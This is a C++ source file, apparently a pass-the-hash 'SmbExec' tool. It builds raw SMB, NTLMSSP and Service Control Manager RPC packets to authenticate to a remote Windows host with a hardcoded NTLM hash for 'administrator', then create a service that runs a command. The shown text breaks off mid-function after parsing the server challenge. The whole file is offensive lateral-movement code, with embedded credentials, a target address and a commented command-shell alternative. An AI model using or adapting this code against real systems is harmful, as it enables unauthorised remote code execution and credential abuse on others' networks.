#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>
#include <string>
#include <openssl/engine.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <string.h>
#include <comdef.h> 
#include <atlconv.h>
#pragma warning(disable:4996)

#pragma comment(lib,"ws2_32.lib")
#define NTLMSSP_Length 32
#define ASN_length_1  32 + 32
#define ASN_length_2  32 + 22
#define ASN_length_3  32 + 20
#define ASN_length_4  32 + 2

using namespace std;

char* g_RecvBuf = NULL;

char session_key_length[2] = { 0x00, 0x00 };
char negotiate_flags[4] = { 0x05,0x80,0x08,0xa0 };
const char* NTLMHash = "44007a27f1bc2cbbad639bf785cf7d68";
const wchar_t* username = L"administrator";
const wchar_t* domain = L"WorkStation";
const wchar_t* Target_IP = L"192.168.98.156";
const char* A_Target_IP = "192.168.98.156";
wchar_t* ServiceName = (wchar_t*)L"CCCCCCCCCCCCCCCCCCCC";
wchar_t* Command = (wchar_t*)L"C:\\Windows\\system32\\notepad.exe ";  //L"%COMSPEC% \/C \"whoami\" ";  "C:\\Windows\\system32\\notepad.exe "
DWORD MessageID = 0;

DWORD ProcessId = GetProcessId(GetCurrentProcess());

typedef struct _SMBHeader
{
	BYTE Protocol[4] = { 0xFF, 0x53, 0x4d, 0x42 };
	BYTE Command = 0x72;
	BYTE ErrorClass = 0x00;
	BYTE Reserved = 0x00;
	BYTE ErrorCode[2] = { 0x00, 0x00 };
	BYTE Flags = 0x18;
	BYTE Flags2[2] = { 0x01, 0x48 };
	BYTE ProcessIDHigh[2] = { 0x00, 0x00 };
	BYTE Signature[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	BYTE Reserved2[2] = { 0x00, 0x00 };
	BYTE TreeID[2] = { 0xFF, 0xFF };
	BYTE ProcessID[2] = { 0x00, 0x00 };
	BYTE UserID[2] = {0x00, 0x00};
	BYTE MultiplexID[2] = {0x00, 0x00};

}SMBHeader,*PSMBHeader;


typedef struct _SMBData
{
	BYTE WordCount = 0x00;
	BYTE ByteCount[2] = { 0x22,0x00 };
	BYTE RequestedDialects_Dialect_BufferFormat = 0x02;
	BYTE RequestedDialects_Dialect_Name[11] = { 0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00 };
	BYTE RequestedDialects_Dialect_BufferFormat2 = 0x02;
	BYTE RequestedDialects_Dialect_Name2[10] = { 0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00 };
	BYTE RequestedDialects_Dialect_BufferFormat3 = { 0x02 };
	BYTE RequestedDialects_Dialect_Name3[10] = {0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00};


}SMBData,*PSMBData;


typedef struct _PacketNetBIOSSessionService
{
	BYTE MessageType = 0x00;
	BYTE Length[3] = { 0x00, 0x00, 0x45 };

}PacketNetBIOSSessionService, * PPacketNetBIOSSessionService;


typedef struct _SMB2Header
{
	BYTE ProtocolID[4] = { 0xfe,0x53,0x4d,0x42 };
	BYTE StructureSize[2] = { 0x40,0x00 };
	BYTE CreditCharge[2] = { 0x01,0x00 };
	BYTE ChannelSequence[2] = { 0x00,0x00 };
	BYTE Reserved[2] = { 0x00,0x00 };
	BYTE Command[2] = { 0x00,0x00 };
	BYTE CreditRequest[2] = { 0x00,0x00 };
	BYTE Flags[4] = { 0x00,0x00,0x00,0x00 };
	BYTE NextCommand[4] = { 0x00,0x00,0x00,0x00 };
	BYTE MessageID[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE ProcessID[4] = { 0x00,0x00,0x00,0x00 };
	BYTE TreeID[4] = { 0x00,0x00,0x00,0x00 };
	BYTE SessionID[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE Signature[16] ={ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

}SMB2Header, * PSMB2Header;

typedef struct _SMB2Data
{
	BYTE StructureSize[2] = { 0x24,0x00 };
	BYTE DialectCount[2] = { 0x02,0x00 };
	BYTE SecurityMode[2] = { 0x01,0x00 };
	BYTE Reserved[2] = { 0x00,0x00 };
	BYTE Capabilities[4] = { 0x40,0x00,0x00,0x00 };
	BYTE ClientGUID[16] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE NegotiateContextOffset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE NegotiateContextCount[2] = { 0x00,0x00 };
	BYTE Reserved2[2] = { 0x00,0x00 };
	BYTE Dialect[2] = { 0x02,0x02 };
	BYTE Dialect2[2] = { 0x10,0x02 };

}SMB2Data, * PSMB2Data;

typedef struct _PacketNTLMSSPNegotiate
{
	BYTE InitialContextTokenID = 0x60;
	BYTE InitialcontextTokenLength = ASN_length_1;
	BYTE ThisMechID = 0x06;
	BYTE ThisMechLength = 0x06;
	BYTE OID[6] = { 0x2b,0x06,0x01,0x05,0x05,0x02 };
	BYTE InnerContextTokenID = 0xa0;
	BYTE InnerContextTokenLength = ASN_length_2;
	BYTE InnerContextTokenID2 = 0x30;
	BYTE InnerContextTokenLength2 = ASN_length_3;
	BYTE MechTypesID = 0xa0;
	BYTE MechTypesLength = 0x0e;
	BYTE MechTypesID2 = 0x30;
	BYTE MechTypesLength2 = 0x0c;
	BYTE MechTypesID3 = 0x06;
	BYTE MechTypesLength3 = 0x0a;
	BYTE MechType[10] = { 0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a };
	BYTE MechTokenID = 0xa2;
	BYTE MechTokenLength = ASN_length_4;
	BYTE NTLMSSPID = 0x04;
	BYTE NTLMSSPLength = NTLMSSP_Length;
	BYTE Identifier[8] = { 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00 };
	BYTE MessageType[4] = {0x01,0x00,0x00,0x00};
	BYTE NegotiateFlags[4] = {0x05,0x80,0x8,0xa0};
	BYTE CallingWorkstationDomain[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE CallingWorkstationName[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

}PacketNTLMSSPNegotiate,*PPacketNTLMSSPNegotiate;

typedef struct PacketSMB2SessionSetupRequest
{
	BYTE StructureSize[2] = { 0x19,0x00 };
	BYTE Flags = 0x00;
	BYTE SecurityMode = 0x01;
	BYTE Capabilities[4] = { 0x00,0x00,0x00,0x00 };
	BYTE Channel[4] = { 0x00,0x00,0x00,0x00 };
	BYTE SecurityBufferOffset[2] = { 0x58,0x00 };
	BYTE SecurityBufferLength[2] = { 0x00,0x00 };
	BYTE PreviousSessionID[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
};

typedef struct _PacketSMB2SessionSetupRequest_nobuf
{
	BYTE StructureSize[2] = { 0x19,0x00 };
	BYTE Flags = 0x00;
	BYTE SecurityMode = 0x01;
	BYTE Capabilities[4] = { 0x00,0x00,0x00,0x00 };
	BYTE Channel[4] = { 0x00,0x00,0x00,0x00 };
	BYTE SecurityBufferOffset[2] = { 0x58,0x00 };
	BYTE SecurityBufferLength[2] = { 0x42,0x00 };
	BYTE PreviousSessionID[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
}PacketSMB2SessionSetupRequest_nobuf, *PPacketSMB2SessionSetupRequest_nobuf;

typedef struct _server_challenge_and_security_blob_bytes
{
	BYTE NTLM_challenge[8];
	BYTE RespType[8] = { 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE TimeStamp[8];
	BYTE Random[8];
	BYTE Reserved[4] = { 0x00,0x00,0x00,0x00 };
	BYTE target_details[];

}server_challenge_and_security_blob_bytes,*pserver_challenge_and_security_blob_bytes;

typedef struct _NTLMSSP_response
{
	BYTE NTLMSSP[16] = { 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x03,0x00,0x00,0x00,0x18,0x00,0x18,0x00 };
	BYTE auth_LM_offset[4] = { 0,0,0,0 };
	BYTE NTLMv2_response_length[2] = { 0,0 };
	BYTE NTLMv2_response_length2[2] = { 0,0 };
	BYTE auth_NTLM_offset[4] = { 0,0,0,0 };
	BYTE auth_domain_length[2] = { 0,0 };
	BYTE auth_domain_length2[2] = { 0,0 };
	BYTE auth_domain_offset[4] = { 0,0,0,0 };
	BYTE auth_username_length[2] = { 0,0 };
	BYTE auth_username_length2[2] = { 0,0 };
	BYTE auth_username_offset[4] = { 0,0,0,0 };
	BYTE auth_hostname_length[2] = { 0,0 };
	BYTE auth_hostname_length2[2] = { 0,0 };
	BYTE auth_hostname_offset[4] = { 0,0,0,0 };
	BYTE session_key_length[2] = { 0,0 };
	BYTE session_key_length2[2] = { 0,0 };
	BYTE session_key_offset[4] = { 0,0,0,0 };
	BYTE negotiate_flags[4] = { 0,0,0,0 };

}NTLMSSP_response,*PNTLMSSP_response;

typedef struct _PacketNTLMSSPAuth
{
	BYTE ASNID[2] = { 0xa1,0x82 };
	BYTE ASNLength_1[2] = { 0x00,0x00 };
	BYTE ASNID2[2] = { 0x30,0x82 };
	BYTE ASNLength_2[2] = { 0x00,0x00 };
	BYTE ASNID3[2] = { 0xa2,0x82 };
	BYTE ASNLength_3[2] = { 0x00,0x00 };
	BYTE NTLMSSPID[2] = {0x04,0x82};
	BYTE NTLMSSPLength[2] = { 0x00,0x00 };

}PacketNTLMSSPAuth,*PPacketNTLMSSPAuth;

typedef struct _PacketSMB2TreeConnectRequest
{
	BYTE StructureSize[2] = { 0x09,0x00 };
	BYTE Reserved[2] = { 0x00,0x00 };
	BYTE PathOffset[2] = { 0x48,0x00 };
	BYTE path_length[2] = { 0x00,0x00 };

}PacketSMB2TreeConnectRequest,*PPacketSMB2TreeConnectRequest;

typedef struct _PacketSMB2CreateRequestFile
{
	BYTE StructureSize[2] = { 0x39,0x00 };
	BYTE Flags = 0x00;
	BYTE RequestedOplockLevel = 0x00;
	BYTE Impersonation[4] = { 0x02,0x00,0x00,0x00 };
	BYTE SMBCreateFlags[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE Reserved[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE DesiredAccess[4] = { 0x03,0x00,0x00,0x00 };
	BYTE FileAttributes[4] = { 0x80,0x00,0x00,0x00 };
	BYTE ShareAccess[4] = { 0x01,0x00,0x00,0x00 };
	BYTE CreateDisposition[4] = { 0x01,0x00,0x00,0x00 };
	BYTE CreateOptions[4] = { 0x40,0x00,0x00,0x00 };
	BYTE NameOffset[2] = { 0x78,0x00 };
	BYTE NameLength[2] = { 0x0c,0x00 };
	BYTE CreateContextsOffset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE CreateContextsLength[4] = { 0x00,0x00,0x00,0x00 };

}PacketSMB2CreateRequestFile,*PPacketSMB2CreateRequestFile;

typedef struct _PacketRPCBind
{
	BYTE Version = 0x05;
	BYTE VersionMinor = 0x00;
	BYTE PacketType = 0x0b;
	BYTE PacketFlags = 0x03;
	BYTE DataRepresentation[4] = { 0x10,0x00,0x00,0x00 };
	BYTE FragLength[2] = { 0x48,0x00 };
	BYTE AuthLength[2] = { 0x00,0x00 };
	BYTE CallID[4] = { 0x01,0x00,0x00,0x00 };
	BYTE MaxXmitFrag[2] = { 0xb8,0x10 };
	BYTE MaxRecvFrag[2] = { 0xb8,0x10 };
	BYTE AssocGroup[4] = { 0x00,0x00,0x00,0x00 };
	BYTE NumCtxItems = 0x01;
	BYTE Unknown[3] = { 0x00,0x00,0x00 };
	BYTE ContextID[2] = { 0x00,0x00 };
	BYTE NumTransItems = 0x01;
	BYTE Unknown2 = 0x00;
	BYTE Interface[16] = { 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03 };
	BYTE InterfaceVer[2] = { 0x02,0x00 };
	BYTE InterfaceVerMinor[2] = { 0x00,0x00 };
	BYTE TransferSyntax[16] = { 0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60 };
	BYTE TransferSyntaxVer[4] = { 0x02,0x00,0x00,0x00 };

}PacketRPCBind,*PPacketRPCBind;

typedef struct _PacketSMB2WriteRequest
{
	BYTE StructureSize[2] = { 0x31,0x00 };
	BYTE DataOffset[2] = { 0x70,0x00 };
	BYTE Length[4] = { 0x00,0x00,0x00,0x00 };
	BYTE Offset[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE FileID[16] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE Channel[4] = { 0x00,0x00,0x00,0x00 };
	BYTE RemainingBytes[4] = { 0x00,0x00,0x00,0x00 };
	BYTE WriteChannelInfoOffset[2] = { 0x00,0x00 };
	BYTE WriteChannelInfoLength[2] = { 0x00,0x00 };
	BYTE Flags[4] = { 0x00,0x00,0x00,0x00 };

}PacketSMB2WriteRequest,*PPacketSMB2WriteRequest;

typedef struct _PacketSMB2ReadRequest
{
	BYTE StructureSize[2] = { 0x31,0x00 };
	BYTE Padding = 0x50;
	BYTE Flags = 0x00;
	BYTE Length[4] = { 0x00,0x00,0x10,0x00 };
	BYTE Offset[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE FileID[16] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE MinimumCount[4] = { 0x00,0x00,0x00,0x00 };
	BYTE Channel[4] = { 0x00,0x00,0x00,0x00 };
	BYTE RemainingBytes[4] = { 0x00,0x00,0x00,0x00 };
	BYTE ReadChannelInfoOffset[2] = { 0x00,0x00 };
	BYTE ReadChannelInfoLength[2] = { 0x00,0x00 };
	BYTE Buffer = 0x30;
		
}PacketSMB2ReadRequest,*PPacketSMB2ReadRequest;

typedef struct _PacketSCMOpenSCManagerW_1
{
	BYTE MachineName_ReferentID[4] = { 0x00,0x00,0x00,0x00 };
	BYTE MachineName_MaxCount[4] = { 0x00,0x00,0x00,0x00 };
	BYTE MachineName_Offset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE MachineName_ActualCount[4] = { 0x00,0x00,0x00,0x00 };

}PacketSCMOpenSCManagerW_1,*PPacketSCMOpenSCManagerW_1;

typedef struct _PacketSCMOpenSCManagerW_2
{
	BYTE Database_ReferentID[4] = { 0x00,0x00,0x00,0x00 };
	BYTE Database_NameMaxCount[4] = { 0x0f,0x00,0x00,0x00 };
	BYTE Database_NameOffset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE Database_NameActualCount[4] = { 0x0f,0x00,0x00,0x00 };
	BYTE Database[30] = { 0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00 };
	BYTE Unknown[2] = { 0xbf,0xbf };
	BYTE AccessMask[4] = {0x3f,0x00,0x00,0x00};

}PacketSCMOpenSCManagerW_2, *PPacketSCMOpenSCManagerW_2;

typedef struct _PacketRPCRequest
{
	BYTE Version = 0x05;
	BYTE VersionMinor = 0x00;
	BYTE PacketType = 0x00;
	BYTE PacketFlags = 0x00;
	BYTE DataRepresentation[4] = { 0x10,0x00,0x00,0x00 };
	BYTE FragLength[2] = { 0x00,0x00 };
	BYTE AuthLength[2] = { 0x00,0x00 };
	BYTE CallID[4] = { 0x00,0x00,0x00,0x00 };
	BYTE AllocHint[4] = { 0x00,0x00,0x00,0x00 };
	BYTE ContextID[2] = { 0x00,0x00 };
	BYTE Opnum[2] = { 0x00,0x00 };

}PacketRPCRequest,*PPacketRPCRequest;

typedef struct _PacketSCMCreateServiceW1
{
	BYTE ContextHandle[20] = { 0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00 ,0x00,0x00,0x00,0x00 };
	BYTE ServiceLength[4] = { 0x00,0x00,0x00,0x00 };
	BYTE ServiceName_Offset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE ServiceName_ActualCount[4] = { 0x00,0x00,0x00,0x00 };

}PacketSCMCreateServiceW1,*PPacketSCMCreateServiceW1;

typedef struct _PacketSCMCreateServiceW2
{
	BYTE DisplayName_ReferentID[4] = { 0x00,0x00,0x00,0x00 };
	BYTE DisplayName_MaxCount[4] = { 0x00,0x00,0x00,0x00 };
	BYTE DisplayName_Offset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE DisplayName_ActualCount[4] = { 0x00,0x00,0x00,0x00 };

}PacketSCMCreateServiceW2, * PPacketSCMCreateServiceW2;

typedef struct _PacketSCMCreateServiceW3
{
	BYTE AccessMask[4] = { 0xff,0x01,0x0f,0x00 };
	BYTE ServiceType[4] = { 0x10,0x00,0x00,0x00 };
	BYTE ServiceStartType[4] = { 0x03,0x00,0x00,0x00 };
	BYTE ServiceErrorControl[4] = { 0x00,0x00,0x00,0x00 };
	BYTE BinaryPathName_MaxCount[4] = { 0x00,0x00,0x00,0x00 };
	BYTE BinaryPathName_Offset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE BinaryPathName_ActualCount[4] = { 0x00,0x00,0x00,0x00 };

}PacketSCMCreateServiceW3, * PPacketSCMCreateServiceW3;

typedef struct _PacketSCMCreateServiceW4
{
	BYTE NULLPointer[4] = { 0x00,0x00,0x00,0x00 };
	BYTE TagID[4] = { 0x00,0x00,0x00,0x00 };
	BYTE NULLPointer2[4] = { 0x00,0x00,0x00,0x00 };
	BYTE DependSize[4] = { 0x00,0x00,0x00,0x00 };
	BYTE NULLPointer3[4] = { 0x00,0x00,0x00,0x00 };
	BYTE NULLPointer4[4] = { 0x00,0x00,0x00,0x00 };
	BYTE PasswordSize[4] = { 0x00,0x00,0x00,0x00 };

}PacketSCMCreateServiceW4, * PPacketSCMCreateServiceW4;

SMBHeader SMBHeaderInit()
{
	SMBHeader SMBHeaderBuf;
	return SMBHeaderBuf;
}

SMBData SMBDataInit()
{
	SMBData SMBDataBuf;
	return SMBDataBuf;
}

SMB2Header SMB2HeaderInit()
{
	SMB2Header SMB2HeaderBuf;
	return SMB2HeaderBuf;
}

SMB2Data SMB2DataInit()
{
	SMB2Data SMB2DataBuf;
	return SMB2DataBuf;
}

PacketNetBIOSSessionService PacketNetBIOSSessionServiceInit()
{
	PacketNetBIOSSessionService PacketNetBIOSSessionServiceBuf;
	return PacketNetBIOSSessionServiceBuf;
}

PacketNTLMSSPNegotiate PacketNTLMSSPNegotiateInit()
{
	PacketNTLMSSPNegotiate PacketNTLMSSPNegotiate;
	return PacketNTLMSSPNegotiate;
}

PacketSMB2SessionSetupRequest PacketSMB2SessionSetupRequestInit()
{
	PacketSMB2SessionSetupRequest PacketSMB2SessionSetupRequest;
	return PacketSMB2SessionSetupRequest;
}

server_challenge_and_security_blob_bytes server_challenge_and_security_blob_bytesInit()
{
	server_challenge_and_security_blob_bytes server_challenge_and_security_blob_bytes;
	return server_challenge_and_security_blob_bytes;
}

NTLMSSP_response NTLMSSP_responseInit()
{
	NTLMSSP_response NTLMSSP_response;
	return NTLMSSP_response;
}

PacketNTLMSSPAuth PacketNTLMSSPAuthInit()
{
	PacketNTLMSSPAuth PacketNTLMSSPAuth;
	return PacketNTLMSSPAuth;
}

PacketSMB2TreeConnectRequest PacketSMB2TreeConnectRequestInit()
{
	PacketSMB2TreeConnectRequest PacketSMB2TreeConnectRequest;
	return PacketSMB2TreeConnectRequest;
}

PacketSMB2CreateRequestFile PacketSMB2CreateRequestFileInit()
{
	PacketSMB2CreateRequestFile PacketSMB2CreateRequestFile;
	return PacketSMB2CreateRequestFile;
}

PacketRPCBind PacketRPCBindInit()
{
	PacketRPCBind PacketRPCBind;
	return PacketRPCBind;
}

PacketSMB2WriteRequest PacketSMB2WriteRequestInit()
{
	PacketSMB2WriteRequest PacketSMB2WriteRequest;
	return PacketSMB2WriteRequest;
}

PacketSMB2ReadRequest PacketSMB2ReadRequestInit()
{
	PacketSMB2ReadRequest PacketSMB2ReadRequest;
	return PacketSMB2ReadRequest;
}

PacketSCMOpenSCManagerW_1 PacketSCMOpenSCManagerW_1Init()
{
	PacketSCMOpenSCManagerW_1 PacketSCMOpenSCManagerW_1;
	return PacketSCMOpenSCManagerW_1;
}

PacketSCMOpenSCManagerW_2 PacketSCMOpenSCManagerW_2Init()
{
	PacketSCMOpenSCManagerW_2 PacketSCMOpenSCManagerW_2;
	return PacketSCMOpenSCManagerW_2;
}

PacketRPCRequest PacketRPCRequestInit()
{
	PacketRPCRequest PacketRPCRequest;
	return PacketRPCRequest;
}

PacketSCMCreateServiceW1 PacketSCMCreateServiceW1Init()
{
	PacketSCMCreateServiceW1 PacketSCMCreateServiceW1;
	return PacketSCMCreateServiceW1;
}

PacketSCMCreateServiceW2 PacketSCMCreateServiceW2Init()
{
	PacketSCMCreateServiceW2 PacketSCMCreateServiceW2;
	return PacketSCMCreateServiceW2;
}

PacketSCMCreateServiceW3 PacketSCMCreateServiceW3Init()
{
	PacketSCMCreateServiceW3 PacketSCMCreateServiceW3;
	return PacketSCMCreateServiceW3;
}

PacketSCMCreateServiceW4 PacketSCMCreateServiceW4Init()
{
	PacketSCMCreateServiceW4 PacketSCMCreateServiceW4;
	return PacketSCMCreateServiceW4;
}


void* memmem(const void* haystack, size_t haystack_len, const void* const needle, const size_t needle_len)
{
	if (haystack == NULL) return NULL; 
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL; 
	if (needle_len == 0) return NULL;

	DWORDLONG offset = 0;
	for (const char* h = (const char*)haystack; haystack_len >= needle_len; ++h, --haystack_len, ++offset) {
		if (!memcmp(h, needle, needle_len)) {
			//return offset;
			return (void*)h;
		}
	}
	return NULL;
}


DWORD SmbExec()
{
	DWORD dwError;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort = 445;
	struct sockaddr_in sin;

	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		dwError = GetLastError();
		printf("[!]WSAStarup Error : %d \n", dwError);
		return dwError;
	}

	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (socks == INVALID_SOCKET)
	{
		dwError = GetLastError();
		printf("[!]Socket Error : %d \n", dwError);
		return dwError;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(sListenPort);
	sin.sin_addr.S_un.S_addr = inet_addr(A_Target_IP);

	if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		dwError = GetLastError();
		printf("[!]Bind Error : %d \n", dwError);
		return dwError;
	}


	//---------------------------------------NTLM--------------------------------------------------
	//拼接包 第一次质询
	SMBHeader SMBHeader = SMBHeaderInit();
	SMBHeader.ProcessID[0] = *(BYTE*)&ProcessId;
	SMBHeader.ProcessID[1] = *((BYTE*)&ProcessId + 1);
	SMBHeader.Command = 114;
	SMBHeader.Flags = 24;
	SMBHeader.Flags2[0] = 1;
	SMBHeader.Flags2[1] = 72;

	SMBData SMBData = SMBDataInit();

	PacketNetBIOSSessionService PacketNetBIOSSessionService1 = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService1.Length[2] = sizeof(SMBHeader) + sizeof(SMBData);

	char* sendbuf = (char*)VirtualAlloc(NULL,1024,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
	memcpy(sendbuf, (char*)&PacketNetBIOSSessionService1,sizeof(PacketNetBIOSSessionService));
	memcpy(sendbuf + sizeof(PacketNetBIOSSessionService1), &SMBHeader,sizeof(SMBHeader));
	memcpy(sendbuf + sizeof(PacketNetBIOSSessionService1) + sizeof(SMBHeader), &SMBData, sizeof(SMBData));


	int ret = send(socks, sendbuf, sizeof(SMBHeader) + sizeof(SMBData) + sizeof(PacketNetBIOSSessionService1), 0);
	if (ret < 0)
	{
		printf("[+]Send %d-Bytes \n", ret);
		closesocket(socks);
		return 0;
	}
	

	DWORD dRet = recv(socks, g_RecvBuf, 4096, 0);
	Sleep(500);


	if (g_RecvBuf[4] == 0xff && g_RecvBuf[5] == 0x53 && g_RecvBuf[6] == 0x4d && g_RecvBuf[7] == 0x42)
	{
		printf("SMB1\r\n");
		exit(-1);
	}
	else
	{
		if (g_RecvBuf[70] == 0x03)
		{
			exit(-1);
		}
	}
	//第二次质询
	ZeroMemory(sendbuf, 1024);
	SMB2Header SMB2Header = SMB2HeaderInit();
	SMB2Header.MessageID[0] = ++MessageID;
	SMB2Header.ProcessID[0] = *(BYTE*)&ProcessId;
	SMB2Header.ProcessID[1] = *((BYTE*)&ProcessId + 1);

	SMB2Data SMB2Data = SMB2DataInit();
	PacketNetBIOSSessionService PacketNetBIOSSessionService2 = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService2.Length[2] = sizeof(SMB2Header) + sizeof(SMB2Data);  //LenOfSMB2Header + LenOfSMB2Data
	memcpy(sendbuf, (char*)&PacketNetBIOSSessionService2, sizeof(PacketNetBIOSSessionService));
	memcpy(sendbuf + sizeof(PacketNetBIOSSessionService2), &SMB2Header, sizeof(SMB2Header));
	memcpy(sendbuf + sizeof(PacketNetBIOSSessionService2) + sizeof(SMB2Header), &SMB2Data, sizeof(SMB2Data));
	ret = send(socks, sendbuf, sizeof(SMB2Header) + sizeof(SMB2Data) + sizeof(PacketNetBIOSSessionService2), 0);
	if (ret < 0)
	{
		printf("[+]Send %d-Bytes \n", ret);
		closesocket(socks);
		return 0;
	}


	//请求挑战 初始化
	SMB2Header = SMB2HeaderInit();
	SMB2Header.MessageID[0] = ++MessageID;
	SMB2Header.ProcessID[0] = *(BYTE*)&ProcessId;
	SMB2Header.ProcessID[1] = *((BYTE*)&ProcessId + 1);
	SMB2Header.Command[0] = 1;
	SMB2Header.CreditRequest[0] = 31;

	SMB2Data = SMB2DataInit();
	PacketNetBIOSSessionService2 = PacketNetBIOSSessionServiceInit();

	PacketNTLMSSPNegotiate PacketNTLMSSPNegotiate = PacketNTLMSSPNegotiateInit();
	DWORD PacketNTLMSSPNegotiateInit_size = sizeof(PacketNTLMSSPNegotiate);

	PacketSMB2SessionSetupRequest PacketSMB2SessionSetupRequest = PacketSMB2SessionSetupRequestInit();
	PacketSMB2SessionSetupRequest.SecurityBufferLength[0] = *(BYTE*)&PacketNTLMSSPNegotiateInit_size;

	//创建一个新的缓冲区存放
	BYTE* PacketSMB2SessionSetupRequest_buf0 = new BYTE[sizeof(PacketSMB2SessionSetupRequest) + PacketNTLMSSPNegotiateInit_size];
	memcpy(PacketSMB2SessionSetupRequest_buf0, &PacketSMB2SessionSetupRequest,sizeof(PacketSMB2SessionSetupRequest));
	memcpy((char*)(ULONG64)PacketSMB2SessionSetupRequest_buf0 + sizeof(PacketSMB2SessionSetupRequest), &PacketNTLMSSPNegotiate,sizeof(PacketNTLMSSPNegotiate));

	PacketNetBIOSSessionService2.Length[2] = sizeof(SMB2Header) + sizeof(PacketSMB2SessionSetupRequest) + PacketNTLMSSPNegotiateInit_size;

	//拼接包 client_send = NetBIOS_session_service + SMB2_header + SMB2_data
	ZeroMemory(sendbuf, 1024);
	memcpy(sendbuf, (char*)&PacketNetBIOSSessionService2, sizeof(PacketNetBIOSSessionService));
	memcpy(sendbuf + sizeof(PacketNetBIOSSessionService2), &SMB2Header, sizeof(SMB2Header));
	memcpy(sendbuf + sizeof(PacketNetBIOSSessionService2) + sizeof(SMB2Header), PacketSMB2SessionSetupRequest_buf0, sizeof(PacketSMB2SessionSetupRequest) + PacketNTLMSSPNegotiateInit_size);
	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService2) + sizeof(SMB2Header) + sizeof(PacketSMB2SessionSetupRequest) + PacketNTLMSSPNegotiateInit_size, 0);
	if (ret < 0)
	{
		printf("[+]Send %d-Bytes \n", ret);
		closesocket(socks);
		return 0;
	}


	//解析返回包，拿到Challenge
	ZeroMemory(g_RecvBuf, 4096);
	Sleep(1000);
	dRet = recv(socks, g_RecvBuf, 4096, 0);

	const void* NtlmPattern = "\x4e\x54\x4c\x4d\x53\x53\x50\x00";
	void* NTLMSSPIndex = memmem(g_RecvBuf, 4096, NtlmPattern, 8);
	WORD Domain_Length = *((WORD*)((ULONG64)NTLMSSPIndex + 12));
	WORD Target_Length = *((WORD*)((ULONG64)NTLMSSPIndex + 40));
	ULONGLONG* session_ID = (ULONG64*)((ULONGLONG)NTLMSSPIndex - 65);
	ULONGLONG* NTLM_challenge = (ULONG64*)((ULONGLONG)NTLMSSPIndex + 24);

	DWORD target_details_len = ((ULONG64)NTLMSSPIndex + 55 + Domain_Length + Target_Length) - ((ULONG64)NTLMSSPIndex + 56 + Domain_Length) + 1;
	char* target_details = new char[target_details_len];
	memcpy(target_details, (char*)((ULONG64)NTLMSSPIndex + 56 + Domain_Length), target_details_len);

	char* target_time_bytes = (char*)VirtualAlloc(NULL, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(target_time_bytes, (char*)((ULONG64)target_details + target_details_len - 12), 8);

	DWORD BufSiZe = 0;
	GetComputerNameW(NULL, &BufSiZe);
	wchar_t* auth_hostname = new wchar_t[BufSiZe];
	GetComputerNameW(auth_hostname, &BufSiZe);
	char auth_hostname_length[2] = { 0x00, 0x00 };
	auth_hostname_length[0] = (BufSiZe * 2);

